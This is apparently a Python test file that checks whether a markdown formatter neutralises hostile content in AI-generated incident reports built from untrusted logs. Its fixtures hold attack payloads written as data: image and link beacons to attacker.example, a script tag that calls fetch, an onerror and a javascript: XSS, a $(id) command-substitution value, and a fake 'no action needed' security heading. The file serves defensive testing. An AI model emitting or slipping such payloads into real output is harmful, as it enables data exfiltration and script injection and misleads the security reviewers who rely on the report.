"""
tests/test_markdown_safety.py — THREAT_MODEL T6.

Model output is derived from untrusted logs and rendered as markdown in the
GitHub job summary. Every model field must render as inert text: no images
(which fetch attacker URLs on view), no links, no raw HTML, no injected
headings, no broken table rows.
"""

import re

from src.formatter import format_markdown, md

CONTEXT = {
    "log_group": "/aws/ecs/svc",
    "start_time": "2026-05-14T09:00:00",
    "end_time": "2026-05-14T09:50:00",
    "duration_minutes": 50,
    "alert": "Deploy failure: build`$(id)` <b>x</b>",
}

HOSTILE_RCA = {
    "title": "Outage ![pixel](https://attacker.example/t.png)",
    "severity": "P1",
    "summary": "All good.\n\n# SECURITY TEAM: no action needed\n<img src=x onerror=alert(1)>",
    "root_cause": "See [the fix](https://attacker.example/fix) for details",
    "impact": "none | injected | cells",
    "deploy_correlation": "<script>fetch('//attacker.example')</script>",
    "contributing_factors": ["**bold claim** and `code`"],
    "timeline": [{"time": "09:22", "event": "![x](https://attacker.example/a.png)"}],
    "hypotheses": ["[click me](javascript:alert(1))"],
    "action_items": [{"priority": "high", "action": "a | b | c", "owner": "[x](y)"}],
}


def render():
    return format_markdown(HOSTILE_RCA, CONTEXT)


def test_md_escapes_link_and_image_syntax():
    out = md("![a](http://x) [b](http://y)")
    assert "](" not in out.replace("\\](", "")


def test_md_neutralizes_html():
    assert "<" not in md("<img src=x onerror=alert(1)>")


def test_md_collapses_newlines():
    assert "\n" not in md("line one\n# heading\nline three")


def test_no_images_or_links_render():
    body = render().rsplit("\n---\n", 1)[0]  # footer link is ours, not model output
    # an unescaped "](" is what makes [text](url) / ![alt](url) active
    assert not re.search(r"(?<!\\)\]\(", body)


def test_no_raw_html_renders():
    out = render()
    assert "<img" not in out and "<script" not in out and "<b>" not in out


def test_model_text_cannot_inject_headings():
    headings = [l for l in render().splitlines() if l.startswith("#")]
    injected = [h for h in headings if "SECURITY TEAM" in h]
    assert injected == []


def test_action_table_rows_keep_three_columns():
    rows = [l for l in render().splitlines() if l.startswith("| HIGH")]
    assert len(rows) == 1
    unescaped_pipes = re.findall(r"(?<!\\)\|", rows[0])
    assert len(unescaped_pipes) == 4  # | prio | action | owner |


def test_attacker_influenced_alert_is_escaped():
    out = render()
    assert "<b>" not in out
    assert "`$(id)`" not in out


def test_benign_text_survives():
    out = format_markdown({"title": "DB pool exhaustion", "root_cause": "max_connections=20 too low"}, CONTEXT)
    assert "DB pool exhaustion" in out
    assert "max\\_connections=20 too low" in out
